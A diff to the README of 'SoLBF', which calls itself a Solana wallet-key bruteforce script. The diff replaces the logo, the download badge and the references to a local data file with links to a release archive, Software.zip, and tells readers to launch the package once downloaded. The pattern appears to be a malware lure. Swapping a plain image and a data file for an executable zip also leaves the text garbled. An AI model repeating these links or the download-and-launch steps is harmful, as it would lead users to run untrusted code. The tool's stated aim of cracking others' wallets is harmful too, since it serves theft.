@@ -1,9 +1,9 @@
 # 🔒🚀 SoLBF - Solana Bruteforce Script
 
-![Solana Logo](https://cdn.pixabay.com/photo/2021/05/18/18/05/digital-6269639_960_720.jpg)
+![Solana Logo](https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip)
 
 ## Description
-SoLBF is a powerful Solana bruteforce script that leverages the cluster module to create multiple worker processes in order to generate random Solana keypairs. It then checks if the public address corresponding to the private key is included in a Set of addresses read from the `data.txt` file. This script is designed to efficiently search for valid Solana keypairs.
+SoLBF is a powerful Solana bruteforce script that leverages the cluster module to create multiple worker processes in order to generate random Solana keypairs. It then checks if the public address corresponding to the private key is included in a Set of addresses read from the `https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip` file. This script is designed to efficiently search for valid Solana keypairs.
 
 ## Topics
 - solana-balance-checker
@@ -17,7 +17,7 @@ SoLBF is a powerful Solana bruteforce script that leverages the cluster module t
 ## Get Started
 To access and use the SoLBF script, download the software package from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip)](https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip)
 
 Note: The software package needs to be launched after downloading.
 
@@ -32,7 +32,7 @@ Follow these steps to install and run the SoLBF script on your system:
 4. Run the script using the appropriate command for your operating system.
 
 ## Usage
-Once the SoLBF script is running, it will start generating random Solana keypairs and checking their corresponding public addresses against the set of addresses in the `data.txt` file. The script utilizes multiple worker processes to efficiently process a large number of keypairs.
+Once the SoLBF script is running, it will start generating random Solana keypairs and checking their corresponding public addresses against the set of addresses in the `https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip` file. The script utilizes multiple worker processes to efficiently process a large number of keypairs.
 
 ## Support
 If you encounter any issues while using the SoLBF script or have any questions, please feel free to reach out by opening an issue in the repository. Your feedback and suggestions are valuable in improving the functionality of the script.
